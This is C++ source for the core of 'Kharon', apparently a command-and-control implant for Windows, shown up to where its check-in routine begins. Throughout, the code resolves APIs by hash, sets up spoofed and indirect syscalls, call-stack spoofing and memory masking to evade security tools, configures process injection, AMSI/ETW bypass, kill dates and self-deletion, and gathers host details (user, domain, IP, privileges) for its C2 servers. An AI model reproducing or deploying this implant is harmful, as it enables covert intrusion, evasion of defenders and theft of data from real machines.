#include <Kharon.h>

using namespace Root;

inline void* operator new(size_t, void* p) { return p; }
inline void operator delete(void*, void*) noexcept {}  

EXTERN_C DECLFN auto Main(
    _In_ UPTR Argument
) -> VOID {
    /* ========= [ check guardrails ] ========= */
    if ( Guardrails() ) {
        return;
    }

    PEB* peb = NtCurrentPeb();

    auto AllocHeap = (PVOID (*)( PVOID, ULONG, SIZE_T ))LdrLoad::_Api( 
        LdrLoad::Module( Hsh::Str<CHAR>( "ntdll.dll" ) ), 
        Hsh::Str<CHAR>( "RtlAllocateHeap" ) 
    );

    auto RtlCreateHeap = (PVOID(*)(ULONG, PVOID, SIZE_T, SIZE_T, PVOID, PVOID))LdrLoad::_Api(
        LdrLoad::Module(Hsh::Str<CHAR>("ntdll.dll")), 
        Hsh::Str<CHAR>("RtlCreateHeap")
    );
    
    PVOID CustomHeap = RtlCreateHeap(
        HEAP_GROWABLE | HEAP_ZERO_MEMORY,
        nullptr,
        0x100000,  // 1MB
        0,
        nullptr,
        nullptr
    );

    Kharon* Kh = (Kharon*)AllocHeap( CustomHeap, HEAP_ZERO_MEMORY, sizeof( Kharon ) ); new (Kh) Kharon();
    
    if (peb->NumberOfHeaps >= peb->MaximumNumberOfHeaps) {
        ULONG newMax = peb->MaximumNumberOfHeaps * 2;
        
        PVOID* newHeaps = (PVOID*)AllocHeap(
            peb->ProcessHeap, 
            HEAP_ZERO_MEMORY, 
            newMax * sizeof(PVOID)
        );

        Mem::Copy( newHeaps, peb->ProcessHeaps, peb->NumberOfHeaps * sizeof(PVOID) );
        
        peb->ProcessHeaps = newHeaps;
        peb->MaximumNumberOfHeaps = newMax;
    }

    peb->ProcessHeaps[peb->NumberOfHeaps] = Kh;
    peb->NumberOfHeaps++;

    Crypt*     KhCrypt   = (Crypt*)    AllocHeap(CustomHeap, HEAP_ZERO_MEMORY, sizeof(Crypt));     new (KhCrypt) Crypt(Kh);
    Spoof*     KhSpoof   = (Spoof*)    AllocHeap(CustomHeap, HEAP_ZERO_MEMORY, sizeof(Spoof));     new (KhSpoof) Spoof(Kh);
    Coff*      KhCoff    = (Coff*)     AllocHeap(CustomHeap, HEAP_ZERO_MEMORY, sizeof(Coff));      new (KhCoff) Coff(Kh);
    Syscall*   KhSyscall = (Syscall*)  AllocHeap(CustomHeap, HEAP_ZERO_MEMORY, sizeof(Syscall));   new (KhSyscall) Syscall(Kh);
    Socket*    KhSocket  = (Socket*)   AllocHeap(CustomHeap, HEAP_ZERO_MEMORY, sizeof(Socket));    new (KhSocket) Socket(Kh);
    Jobs*      KhJobs    = (Jobs*)     AllocHeap(CustomHeap, HEAP_ZERO_MEMORY, sizeof(Jobs));      new (KhJobs) Jobs(Kh);
    Useful*    KhUseful  = (Useful*)   AllocHeap(CustomHeap, HEAP_ZERO_MEMORY, sizeof(Useful));    new (KhUseful) Useful(Kh);
    Library*   KhLibrary = (Library*)  AllocHeap(CustomHeap, HEAP_ZERO_MEMORY, sizeof(Library));   new (KhLibrary) Library(Kh);
    Token*     KhToken   = (Token*)    AllocHeap(CustomHeap, HEAP_ZERO_MEMORY, sizeof(Token));     new (KhToken) Token(Kh);
    Heap*      KhHeap    = (Heap*)     AllocHeap(CustomHeap, HEAP_ZERO_MEMORY, sizeof(Heap));      new (KhHeap) Heap(Kh);
    Process*   KhProcess = (Process*)  AllocHeap(CustomHeap, HEAP_ZERO_MEMORY, sizeof(Process));   new (KhProcess) Process(Kh);
    Memory*    KhMemory  = (Memory*)   AllocHeap(CustomHeap, HEAP_ZERO_MEMORY, sizeof(Memory));    new (KhMemory) Memory(Kh);
    Thread*    KhThread  = (Thread*)   AllocHeap(CustomHeap, HEAP_ZERO_MEMORY, sizeof(Thread));    new (KhThread) Thread(Kh);
    Task*      KhTask    = (Task*)     AllocHeap(CustomHeap, HEAP_ZERO_MEMORY, sizeof(Task));      new (KhTask) Task(Kh);
    Transport* KhTransport = (Transport*)AllocHeap(CustomHeap, HEAP_ZERO_MEMORY, sizeof(Transport));new (KhTransport) Transport(Kh);
    Package*   KhPackage = (Package*)  AllocHeap(CustomHeap, HEAP_ZERO_MEMORY, sizeof(Package));   new (KhPackage) Package(Kh);
    Parser*    KhParser  = (Parser*)   AllocHeap(CustomHeap, HEAP_ZERO_MEMORY, sizeof(Parser));    new (KhParser) Parser(Kh);
    Mask*      KhMask    = (Mask*)     AllocHeap(CustomHeap, HEAP_ZERO_MEMORY, sizeof(Mask));      new (KhMask) Mask(Kh);
    Injection* khInject  = (Injection*)AllocHeap(CustomHeap, HEAP_ZERO_MEMORY, sizeof(Injection)); new (khInject) Injection(Kh);

    Kh->InitInject( khInject );
    Kh->InitCrypt( KhCrypt );
    Kh->InitSpoof( KhSpoof );
    Kh->InitCoff( KhCoff );
    Kh->InitMemory( KhMemory );
    Kh->InitSyscall( KhSyscall );
    Kh->InitSocket( KhSocket );
    Kh->InitJobs( KhJobs );
    Kh->InitUseful( KhUseful );
    Kh->InitHeap( KhHeap );
    Kh->InitLibrary( KhLibrary );
    Kh->InitToken( KhToken );
    Kh->InitMask( KhMask );
    Kh->InitProcess( KhProcess );
    Kh->InitTask( KhTask );
    Kh->InitTransport( KhTransport );
    Kh->InitThread( KhThread );
    Kh->InitPackage( KhPackage );
    Kh->InitParser( KhParser );

    Kh->Init();

    Kh->Start( Argument );

    return;
}

DECLFN Kharon::Kharon( VOID ) {
    if ( this->Session.Base.Start ) return;

    /* ========= [ get base ] ========= */
    this->Session.Base.Start  = StartPtr();
    this->Session.Base.Length = ( EndPtr() - this->Session.Base.Start );

    /* ========= [ init modules and funcs ] ========= */
    this->Krnl32.Handle   = LdrLoad::Module( Hsh::Str<CHAR>( "kernel32.dll" ) );
    this->KrnlBase.Handle = LdrLoad::Module( Hsh::Str<CHAR>( "kernelbase.dll" ) );
    this->Ntdll.Handle    = LdrLoad::Module( Hsh::Str<CHAR>( "ntdll.dll" ) );

    RSL_IMP( Ntdll  );
    RSL_IMP( Krnl32 );
    RSL_IMP( KrnlBase );
}

auto DECLFN Kharon::Init(
    VOID
) -> void {
    /* ========= [ get config ] ========= */
    KHARON_CONFIG Cfg = { 0 };

    GetConfig( &Cfg );

    this->Config.Injection.TechniqueId = Cfg.Injection.TechniqueId;
    this->Config.Injection.StompModule = Cfg.Injection.StompModule;

    this->Config.AmsiEtwBypass = Cfg.AmsiEtwBypass;
    this->Config.SleepTime     = Cfg.SleepTime;
    this->Config.Jitter        = Cfg.Jitter;
    this->Config.BofHook       = Cfg.BofProxy;
    this->Config.Syscall       = Cfg.Syscall;
    this->Config.ChunkSize     = Cfg.ChunkSize;

    this->Config.Postex.ForkPipe = Cfg.Postex.ForkPipe;
    this->Config.Postex.Spawnto  = Cfg.Postex.Spawnto;

    this->Config.Worktime.Enabled   = Cfg.Worktime.Enabled;
    this->Config.Worktime.StartHour = Cfg.Worktime.StartHour;
    this->Config.Worktime.StartMin  = Cfg.Worktime.StartMin;
    this->Config.Worktime.EndHour   = Cfg.Worktime.EndHour;
    this->Config.Worktime.EndMin    = Cfg.Worktime.EndMin;

    this->Session.AgentID = Cfg.AgentId;

    this->Config.Mask.TechniqueID = Cfg.Mask.Beacon;
    this->Config.Mask.Heap        = Cfg.Mask.Heap;

    this->Config.KillDate.Day        = Cfg.KillDate.Day;
    this->Config.KillDate.Month      = Cfg.KillDate.Month;
    this->Config.KillDate.Year       = Cfg.KillDate.Year;
    this->Config.KillDate.Enabled    = Cfg.KillDate.Enabled;
    this->Config.KillDate.ExitProc   = Cfg.KillDate.ExitProc;
    this->Config.KillDate.SelfDelete = Cfg.KillDate.SelfDelete;

    this->Config.Guardrails.DomainName = Cfg.Guardrails.DomainName;
    this->Config.Guardrails.UserName   = Cfg.Guardrails.UserName;
    this->Config.Guardrails.IpAddress  = Cfg.Guardrails.IpAddress;
    this->Config.Guardrails.HostName   = Cfg.Guardrails.HostName;

    this->Config.Web.HostQtt     = Cfg.Web.HostQtt;
    this->Config.Web.PortQtt     = Cfg.Web.PortQtt;
    this->Config.Web.EndpointQtt = Cfg.Web.EndpointQtt;

    this->Config.Web.Host     = (WCHAR**)this->Ntdll.RtlAllocateHeap( (PVOID)this->Session.HeapHandle, HEAP_ZERO_MEMORY, this->Config.Web.HostQtt     * sizeof( WCHAR* ) );
    this->Config.Web.Port     = (ULONG* )this->Ntdll.RtlAllocateHeap( (PVOID)this->Session.HeapHandle, HEAP_ZERO_MEMORY, this->Config.Web.PortQtt     * sizeof( ULONG  ) );
    this->Config.Web.EndPoint = (WCHAR**)this->Ntdll.RtlAllocateHeap( (PVOID)this->Session.HeapHandle, HEAP_ZERO_MEMORY, this->Config.Web.EndpointQtt * sizeof( WCHAR* ) );

    COPY_WEB_ARRAY( this->Config.Web.Host,     Cfg.Web.Host,     this->Config.Web.HostQtt     );
    COPY_WEB_ARRAY( this->Config.Web.Port,     Cfg.Web.Port,     this->Config.Web.PortQtt     );
    COPY_WEB_ARRAY( this->Config.Web.EndPoint, Cfg.Web.EndPoint, this->Config.Web.EndpointQtt );

    if ( Cfg.Web.Host )     this->Ntdll.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Cfg.Web.Host );
    if ( Cfg.Web.Port )     this->Ntdll.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Cfg.Web.Port );
    if ( Cfg.Web.EndPoint ) this->Ntdll.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Cfg.Web.EndPoint );

    this->Config.Web.Method        = Cfg.Web.Method;
    this->Config.Web.ProxyEnabled  = Cfg.Web.ProxyEnabled;
    this->Config.Web.ProxyUrl      = Cfg.Web.ProxyUrl;
    this->Config.Web.ProxyUsername = Cfg.Web.ProxyUsername;
    this->Config.Web.ProxyPassword = Cfg.Web.ProxyPassword;
    this->Config.Web.UserAgent     = Cfg.Web.UserAgent;
    this->Config.Web.HttpHeaders   = Cfg.Web.HttpHeaders;
    this->Config.Web.Secure        = Cfg.Web.Secure;

    /* ========= [ init modules and funcs ] ========= */
    this->Mscoree.Handle   = LdrLoad::Module( Hsh::Str<CHAR>( "mscoree.dll" ) );
    this->Advapi32.Handle  = LdrLoad::Module( Hsh::Str<CHAR>( "advapi32.dll" ) );
    this->Wininet.Handle   = LdrLoad::Module( Hsh::Str<CHAR>( "wininet.dll" ) );
    this->Oleaut32.Handle  = LdrLoad::Module( Hsh::Str<CHAR>( "oleaut32.dll" ) );
    this->User32.Handle    = LdrLoad::Module( Hsh::Str<CHAR>( "user32.dll" ) );
    this->Shell32.Handle   = LdrLoad::Module( Hsh::Str<CHAR>( "shell32.dll" ) );
    this->Cryptbase.Handle = LdrLoad::Module( Hsh::Str<CHAR>( "cryptbase.dll" ) );
    this->Ws2_32.Handle    = LdrLoad::Module( Hsh::Str<CHAR>( "ws2_32.dll" ) );
    this->Msvcrt.Handle    = LdrLoad::Module( Hsh::Str<CHAR>( "msvcrt.dll" ) );
    this->Iphlpapi.Handle  = LdrLoad::Module( Hsh::Str<CHAR>( "iphlpapi.dll" ) );

    /* ========= [ calculate stack for spoof ] ========= */
    this->Spf->Setup.First.Size  = this->Spf->StackSizeWrapper( this->Spf->Setup.First.Ptr );
    this->Spf->Setup.Second.Size = this->Spf->StackSizeWrapper( this->Spf->Setup.Second.Ptr );

    if ( ! this->Mscoree.Handle   ) this->Mscoree.Handle   = this->Lib->Load( "mscoree.dll"   );
    if ( ! this->Advapi32.Handle  ) this->Advapi32.Handle  = this->Lib->Load( "advapi32.dll"  );
    if ( ! this->Wininet.Handle   ) this->Wininet.Handle   = this->Lib->Load( "wininet.dll"   );
    if ( ! this->Oleaut32.Handle  ) this->Oleaut32.Handle  = this->Lib->Load( "oleaut32.dll"  );
    if ( ! this->User32.Handle    ) this->User32.Handle    = this->Lib->Load( "user32.dll"    );
    if ( ! this->Shell32.Handle   ) this->Shell32.Handle   = this->Lib->Load( "shell32.dll"   );
    if ( ! this->Cryptbase.Handle ) this->Cryptbase.Handle = this->Lib->Load( "cryptbase.dll" );
    if ( ! this->Ws2_32.Handle    ) this->Ws2_32.Handle    = this->Lib->Load( "ws2_32.dll"    );
    if ( ! this->Msvcrt.Handle    ) this->Msvcrt.Handle    = this->Lib->Load( "msvcrt.dll"    );
    if ( ! this->Iphlpapi.Handle  ) this->Iphlpapi.Handle  = this->Lib->Load( "iphlpapi.dll"  );

    RSL_IMP( Mscoree   );
    RSL_IMP( Advapi32  );
    RSL_IMP( Wininet   );
    RSL_IMP( Oleaut32  );
    RSL_IMP( User32    );
    RSL_IMP( Shell32   );
    RSL_IMP( Cryptbase );
    RSL_IMP( Ws2_32    );
    RSL_IMP( Msvcrt    );
    RSL_IMP( Iphlpapi  );

    this->Ntdll.khRtlFillMemory = ( decltype( this->Ntdll.khRtlFillMemory ) )LdrLoad::_Api( this->Ntdll.Handle, Hsh::Str<CHAR>( "RtlFillMemory" ) );
    this->Krnl32.InitializeProcThreadAttributeList = ( decltype( this->Krnl32.InitializeProcThreadAttributeList ) )this->Krnl32.GetProcAddress( (HMODULE)this->Krnl32.Handle, "InitializeProcThreadAttributeList" );
    this->Krnl32.UpdateProcThreadAttribute         = ( decltype( this->Krnl32.UpdateProcThreadAttribute ) )this->Krnl32.GetProcAddress( (HMODULE)this->Krnl32.Handle, "UpdateProcThreadAttribute" );
    this->Krnl32.DeleteProcThreadAttributeList     = ( decltype( this->Krnl32.DeleteProcThreadAttributeList ) )this->Krnl32.GetProcAddress( (HMODULE)this->Krnl32.Handle, "DeleteProcThreadAttributeList" );;

    KhDbgz( "Library kernel32.dll  Loaded at %p and Functions Resolveds", this->Krnl32.Handle    );
    KhDbgz( "Library ntdll.dll     Loaded at %p and Functions Resolveds", this->Ntdll.Handle     );
    KhDbgz( "Library mscoree.dll   Loaded at %p and Functions Resolveds", this->Mscoree.Handle   );
    KhDbgz( "Library advapi32.dll  Loaded at %p and Functions Resolveds", this->Advapi32.Handle  );
    KhDbgz( "Library wininet.dll   Loaded at %p and Functions Resolveds", this->Wininet.Handle   );
    KhDbgz( "Library Oleaut32.dll  Loaded at %p and Functions Resolveds", this->Oleaut32.Handle  );
    KhDbgz( "Library user32.dll    Loaded at %p and Functions Resolveds", this->User32.Handle    );
    KhDbgz( "Library shell32.dll   Loaded at %p and Functions Resolveds", this->Shell32.Handle   );
    KhDbgz( "Library cryptbase.dll Loaded at %p and Functions Resolveds", this->Cryptbase.Handle );
    KhDbgz( "Library ws2_32.dll    Loaded at %p and Functions Resolveds", this->Ws2_32.Handle    );
    KhDbgz( "Library msvcrt.dll    Loaded at %p and Functions Resolveds", this->Msvcrt.Handle    );
    KhDbgz( "Library iphlpapi.dll  Loaded at %p and Functions Resolveds", this->Iphlpapi.Handle  );

    /* ========= [ cfg exceptions to sleep obf ] ========= */
    if ( this->Machine.CfgEnabled = this->Usf->CfgCheck() ) {
        this->Usf->CfgAddrAdd( (PVOID)this->Ntdll.Handle, (PVOID)this->Ntdll.NtSetContextThread );
        this->Usf->CfgAddrAdd( (PVOID)this->Ntdll.Handle, (PVOID)this->Ntdll.NtGetContextThread );
        this->Usf->CfgAddrAdd( (PVOID)this->Ntdll.Handle, (PVOID)this->Ntdll.NtWaitForSingleObject );
        this->Usf->CfgAddrAdd( (PVOID)this->Krnl32.Handle, (PVOID)this->Krnl32.WaitForSingleObjectEx );
        this->Usf->CfgAddrAdd( (PVOID)this->Krnl32.Handle, (PVOID)this->Krnl32.VirtualProtect );
        this->Usf->CfgAddrAdd( (PVOID)this->Krnl32.Handle, (PVOID)this->Krnl32.SetEvent );
        this->Usf->CfgAddrAdd( (PVOID)this->Cryptbase.Handle, (PVOID)this->Cryptbase.SystemFunction040 );
        this->Usf->CfgAddrAdd( (PVOID)this->Cryptbase.Handle, (PVOID)this->Cryptbase.SystemFunction041 );
    }

    /* ========= [ syscalls setup ] ========= */
    this->Sys->Ext[Sys::Alloc].Address       = U_PTR( this->Ntdll.NtAllocateVirtualMemory );
    this->Sys->Ext[Sys::Write].Address       = U_PTR( this->Ntdll.NtWriteVirtualMemory );
    this->Sys->Ext[Sys::OpenProc].Address    = U_PTR( this->Ntdll.NtOpenProcess );
    this->Sys->Ext[Sys::OpenThrd].Address    = U_PTR( this->Ntdll.NtOpenThread );
    this->Sys->Ext[Sys::QueueApc].Address    = U_PTR( this->Ntdll.NtQueueApcThread );
    this->Sys->Ext[Sys::Protect].Address     = U_PTR( this->Ntdll.NtProtectVirtualMemory );
    this->Sys->Ext[Sys::CrThread].Address    = U_PTR( this->Ntdll.NtCreateThreadEx );
    this->Sys->Ext[Sys::CrSectn].Address     = U_PTR( this->Ntdll.NtCreateSection );
    this->Sys->Ext[Sys::MapView].Address     = U_PTR( this->Ntdll.NtMapViewOfSection );
    this->Sys->Ext[Sys::Read].Address        = U_PTR( this->Ntdll.NtReadVirtualMemory );
    this->Sys->Ext[Sys::Free].Address        = U_PTR( this->Ntdll.NtFreeVirtualMemory );
    this->Sys->Ext[Sys::GetCtxThrd].Address  = U_PTR( this->Ntdll.NtGetContextThread );
    this->Sys->Ext[Sys::SetCtxThrd].Address  = U_PTR( this->Ntdll.NtSetContextThread );
    this->Sys->Ext[Sys::OpenPrToken].Address = U_PTR( this->Ntdll.NtOpenThreadTokenEx );
    this->Sys->Ext[Sys::OpenThToken].Address = U_PTR( this->Ntdll.NtOpenProcessTokenEx );
    
    for ( INT i = 0; i < Sys::Last; i++ ) {
        this->Sys->Fetch( i );
    }

    /* ========= [ key generation to xor heap and package ] ========= */
    for ( INT i = 0; i < sizeof( this->Crp->XorKey ); i++ ) {
        this->Crp->XorKey[i] = (BYTE)Rnd32();
        this->Crp->LokKey[i] = (BYTE)Rnd32();
    }

    /* ========= [ informations collection ] ========= */
    CHAR   cProcessorName[MAX_PATH] = { 0 };

    BOOL   IsWow64      = FALSE;
    ULONG  TmpVal       = 0;
    ULONG  TokenInfoLen = 0;
    HANDLE TokenHandle  = nullptr;
    BOOL   Success      = FALSE;
    HKEY   KeyHandle    = nullptr;

    ULONG  ProcBufferSize    = sizeof( cProcessorName );
    PCHAR  cProcessorNameReg = "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0";

    SYSTEM_INFO     SysInfo   = { 0 };
    MEMORYSTATUSEX  MemInfoEx = { 0 };
    TOKEN_ELEVATION Elevation = { 0 };

    PROCESS_EXTENDED_BASIC_INFORMATION PsBasicInfoEx = { 0 };

    MemInfoEx.dwLength = sizeof( MEMORYSTATUSEX );

    this->Machine.AllocGran = SysInfo.dwAllocationGranularity;
    this->Machine.PageSize  = SysInfo.dwPageSize;

    this->Machine.OsMjrV  = NtCurrentPeb()->OSMajorVersion;
    this->Machine.OsMnrV  = NtCurrentPeb()->OSMinorVersion;
    this->Machine.OsBuild = NtCurrentPeb()->OSBuildNumber;

    this->Ntdll.NtQueryInformationProcess( 
        NtCurrentProcess(), ProcessBasicInformation, 
        &PsBasicInfoEx, sizeof( PsBasicInfoEx ), nullptr 
    );

    this->Krnl32.GlobalMemoryStatusEx( &MemInfoEx );
    this->Krnl32.GetNativeSystemInfo( &SysInfo );

    this->Mm->PageSize = SysInfo.dwPageSize;
    this->Mm->PageGran = SysInfo.dwAllocationGranularity;

    this->Krnl32.IsWow64Process( NtCurrentProcess(), &IsWow64 );

    if ( IsWow64 ) {
        this->Session.ProcessArch = 0x86;
    } else {
        this->Session.ProcessArch = 0x64;
    }

	if ( 
		SysInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 || 
		SysInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_IA64
	) {
		this->Machine.OsArch = 0x64;
	} else {
		this->Machine.OsArch = 0x86;
	}

    this->Machine.ProcessorsNbr = SysInfo.dwNumberOfProcessors;

    this->Session.ProcessID = HandleToUlong( NtCurrentTeb()->ClientId.UniqueProcess );
    this->Session.ThreadID  = HandleToUlong( NtCurrentTeb()->ClientId.UniqueThread );
    this->Session.ParentID  = HandleToUlong( PsBasicInfoEx.BasicInfo.InheritedFromUniqueProcessId );

    this->Session.ImagePath   = A_PTR( this->Hp->Alloc( MAX_PATH ) );
    this->Session.CommandLine = A_PTR( this->Hp->Alloc( MAX_PATH ) );

    Str::WCharToChar( this->Session.ImagePath, PsBasicInfoEx.PebBaseAddress->ProcessParameters->ImagePathName.Buffer, Str::LengthW( PsBasicInfoEx.PebBaseAddress->ProcessParameters->ImagePathName.Buffer ) + 1 );
    Str::WCharToChar( this->Session.CommandLine, PsBasicInfoEx.PebBaseAddress->ProcessParameters->CommandLine.Buffer, Str::LengthW( PsBasicInfoEx.PebBaseAddress->ProcessParameters->CommandLine.Buffer ) + 1 );

    Success = this->Advapi32.OpenProcessToken( NtCurrentProcess(), TOKEN_QUERY, &TokenHandle );
    Success = this->Advapi32.GetTokenInformation( TokenHandle, TokenElevation, &Elevation, sizeof( Elevation ), &TokenInfoLen );

    this->Machine.TotalRAM   = ( MemInfoEx.ullTotalPhys / ( 1024*1024 ) );
    this->Machine.AvalRAM    = ( MemInfoEx.ullAvailPhys / ( 1024*1024 ) );
    this->Machine.UsedRAM    = ( ( MemInfoEx.ullTotalPhys / ( 1024*1024 ) ) - ( MemInfoEx.ullAvailPhys / ( 1024*1024 ) ) );;
    this->Machine.PercentRAM = MemInfoEx.dwMemoryLoad;

    this->Session.Elevated = Elevation.TokenIsElevated;

    Success = this->Krnl32.GetComputerNameExA( ComputerNameDnsHostname, NULL, &TmpVal );
    if ( ! Success ) {
        this->Machine.CompName = (PCHAR)this->Hp->Alloc( TmpVal );
        this->Krnl32.GetComputerNameExA( ComputerNameDnsHostname, this->Machine.CompName, &TmpVal );
    }

    Success = this->Krnl32.GetComputerNameExA( ComputerNameDnsDomain, NULL, &TmpVal );
    if ( ! Success ) {
        this->Machine.DomName = (PCHAR)this->Hp->Alloc( TmpVal );
        this->Krnl32.GetComputerNameExA( ComputerNameDnsDomain, this->Machine.DomName, &TmpVal );
    }

    Success = this->Krnl32.GetComputerNameExA( ComputerNameNetBIOS, NULL, &TmpVal );
    if ( ! Success ) {
        this->Machine.NetBios = (PCHAR)this->Hp->Alloc( TmpVal );
        this->Krnl32.GetComputerNameExA( ComputerNameNetBIOS, A_PTR( this->Machine.NetBios ), &TmpVal );
    }

    IN_ADDR          IpObject   = { 0 };
    ULONG            AdapterLen = 0;
    PVOID            Terminator = nullptr;
    IP_ADAPTER_INFO* Adapter    = { nullptr };

    KhDbgz("adp: %p", this->Iphlpapi.GetAdaptersInfo);

    this->Iphlpapi.GetAdaptersInfo( nullptr, &AdapterLen );
    Adapter = (IP_ADAPTER_INFO*)this->Hp->Alloc( AdapterLen );
    if ( Adapter ) {
        IP_ADAPTER_INFO* CurrentAdapter = Adapter;

        while ( Adapter ) {
            if ( this->Iphlpapi.GetAdaptersInfo( CurrentAdapter, &AdapterLen ) ) {
                if ( this->Ntdll.RtlIpv4StringToAddressA( CurrentAdapter->IpAddressList.IpAddress.String, FALSE, (PCHAR*)&Terminator, &IpObject ) ) {
                    this->Machine.IpAddress = IpObject.S_un.S_addr;
                    break;
                }

                CurrentAdapter = CurrentAdapter->Next;
            }

            break;
        }

        this->Hp->Free( Adapter );
    }

    TmpVal = MAX_PATH;
    this->Machine.UserName = (PCHAR)this->Hp->Alloc( TmpVal );
    this->Advapi32.GetUserNameA( this->Machine.UserName, &TmpVal );
    
    this->Advapi32.RegOpenKeyExA( 
        HKEY_LOCAL_MACHINE, cProcessorNameReg,
        0, KEY_READ, &KeyHandle
    );

    this->Advapi32.RegQueryValueExA(
        KeyHandle, "ProcessorNameString", nullptr, nullptr,
        B_PTR( cProcessorName ), &ProcBufferSize
    );

    this->Machine.ProcessorName = (PCHAR)this->Hp->Alloc( ProcBufferSize );
    Mem::Copy( this->Machine.ProcessorName, cProcessorName, ProcBufferSize );
    
    this->Config.Mask.NtContinueGadget = ( LdrLoad::_Api( this->Ntdll.Handle, Hsh::Str( "LdrInitializeThunk" ) ) + 19 );
    this->Config.Mask.JmpGadget        = this->Usf->FindGadget( this->Ntdll.Handle, 0x23 );

    if ( ! this->Config.Mask.NtContinueGadget ) {
        KhDbgz("dont was possible found the NtContinue gadget, using NtContinue address\n");
        this->Config.Mask.NtContinueGadget = (UPTR)this->Ntdll.NtContinue;
    }

    KhDbgz( "======== Session Informations ========" );
    KhDbgz( "Agent UUID: %s", this->Session.AgentID );
    KhDbgz( "Image Path: %s", this->Session.ImagePath );
    KhDbgz( "Command Line: %s", this->Session.CommandLine );
    KhDbgz( "Process ID: %d", this->Session.ProcessID );
    KhDbgz( "Parent ID: %d", this->Session.ParentID );
    KhDbgz( "Sleep Time: %d", this->Config.SleepTime );
    KhDbgz( "Jitter Time: %d\n", this->Config.Jitter );

    KhDbgz( "Encryption Key[16] = "
        "[0x%X] [0x%X] [0x%X] [0x%X] [0x%X] [0x%X] [0x%X] [0x%X] [0x%X] [0x%X] [0x%X] [0x%X] [0x%X] [0x%X] [0x%X] [0x%X] \n", 
        this->Crp->LokKey[0],  this->Crp->LokKey[1],  this->Crp->LokKey[2],  this->Crp->LokKey[0], 
        this->Crp->LokKey[3],  this->Crp->LokKey[4],  this->Crp->LokKey[5],  this->Crp->LokKey[0], 
        this->Crp->LokKey[6],  this->Crp->LokKey[7],  this->Crp->LokKey[8],  this->Crp->LokKey[0], 
        this->Crp->LokKey[9],  this->Crp->LokKey[10], this->Crp->LokKey[11], this->Crp->LokKey[12], 
        this->Crp->LokKey[13], this->Crp->LokKey[14], this->Crp->LokKey[15]
    );

    KhDbgz( "======== Machine Informations ========" );
    KhDbgz( "User Name: %s", this->Machine.UserName );
    KhDbgz( "Computer Name: %s", this->Machine.CompName );
    KhDbgz( "Domain Name: %s", this->Machine.DomName );
    KhDbgz( "NETBIOS: %s", this->Machine.NetBios );
    KhDbgz( "Processor Name: %s", this->Machine.ProcessorName );
    KhDbgz( "Total RAM: %d", this->Machine.TotalRAM );
    KhDbgz( "Aval RAM: %d", this->Machine.AvalRAM );
    KhDbgz( "Used RAM: %d", this->Machine.UsedRAM );
    KhDbgz( "Win Version: %d.%d.%d\n", this->Machine.OsMjrV, this->Machine.OsMnrV, this->Machine.OsBuild);

    KhDbgz( "======== Transport Informations ========" );
    KhDbgz("profile c2: %X", PROFILE_C2);

#if PROFILE_C2 == PROFILE_WEB
    for ( INT i = 0; i < this->Config.Web.HostQtt; i++ ) {
        KhDbgz( "Host: %S", this->Config.Web.Host[i] );
        KhDbgz( "Port: %d", this->Config.Web.Port[i] );
    }

    for ( INT i = 0; i < this->Config.Web.EndpointQtt; i++ ) {
        KhDbgz( "Endpoint: %S", this->Config.Web.EndPoint[i] );
    }

    KhDbgz( "WebMethod: %S", this->Config.Web.Method );
    KhDbgz( "User Agent: %S", this->Config.Web.UserAgent );
    KhDbgz( "Headers: %S", this->Config.Web.HttpHeaders );
    KhDbgz( "Secure: %s", this->Config.Web.Secure ? "TRUE" : "FALSE" );
    KhDbgz( "Proxy Enabled: %s", this->Config.Web.ProxyEnabled ? "TRUE" : "FALSE" );
    KhDbgz( "Proxy URL: %S\n", this->Config.Web.ProxyUrl );
#endif
#if PROFILE_C2 == PROFILE_SMB
    KhDbgz( "SMB Pipe Name: %s\n", this->Config.Pipe.Name );
#endif

    KhDbgz("======== Evasion Settings ========");
    KhDbgz("Bypass      : %s", 
        this->Config.AmsiEtwBypass == 0x000 ? "None" :
        this->Config.AmsiEtwBypass == 0x100 ? "All"  :
        this->Config.AmsiEtwBypass == 0x700 ? "AMSI" :
        this->Config.AmsiEtwBypass == 0x400 ? "ETW"  : "Unknown"
    );
    KhDbgz("BOF Proxy  : %s", this->Config.BofHook          ? "Enabled" : "Disabled");
    KhDbgz("Mask Heap  : %s", this->Config.Mask.Heap        ? "Enabled" : "Disabled");
    KhDbgz("Mask Beacon: %s", 
        this->Config.Mask.TechniqueID == eMask::Timer ? "Timer" : 
        this->Config.Mask.TechniqueID == eMask::None  ? "None"  : "Unknown"
    );
    KhDbgz("Syscall: %s", 
        this->Config.Syscall == SYSCALL_SPOOF_INDIRECT ? "Spoof + Indirect" :
        this->Config.Syscall == SYSCALL_SPOOF          ? "Spoof"            :
        this->Config.Syscall == SYSCALL_NONE           ? "None"             : "Unknown"
    );
    KhDbgz("Spawnto: %S\n", this->Config.Postex.Spawnto);

    KhDbgz("======== Guardrails Settings ========");
    KhDbgz("User   Name: %s", this->Config.Guardrails.UserName);
    KhDbgz("Host   Name: %s", this->Config.Guardrails.HostName);
    KhDbgz("Domain Name: %s", this->Config.Guardrails.DomainName);
    KhDbgz("IpAddress: %s\n", this->Config.Guardrails.IpAddress);

    KhDbgz("======== WorkTime Settings ========");
    KhDbgz("WorkTime Check: %s", this->Config.Worktime.Enabled ? "Enabled" : "Disabled");
    KhDbgz("WorkTime Start: %d:%d", this->Config.Worktime.StartHour, this->Config.Worktime.StartMin);
    KhDbgz("WorkTime End  : %d:%d\n,", this->Config.Worktime.EndHour, this->Config.Worktime.EndMin);

    KhDbgz("======== Killdate Settings ========");
    KhDbgz("Killdate Check: %s", this->Config.KillDate.Enabled ? "Enabled" : "Disabled");
    KhDbgz("Killdate Date : %d/%d/%d", this->Config.KillDate.Month, this->Config.KillDate.Day, this->Config.KillDate.Year);
    KhDbgz("Killdate Exit : %s", this->Config.KillDate.ExitProc ? "Process" : "Thread");
    KhDbgz("Killdate Self Delete: %s\n", this->Config.KillDate.SelfDelete ? "Enabled" : "Disabled");

    KhDbgz("======== Chunk Size Settings ========");
    KhDbgz("Chunk Size: %d\n", this->Config.ChunkSize);    

    KhDbgz( "Collected informations and setup agent\n" );

    return;
}

auto DECLFN Kharon::Start( 
    _In_ UPTR Argument 
) -> VOID {
    KhDbgz( "Initializing the principal routine" );

    //
    // do checkin routine (request + validate connection)
    //
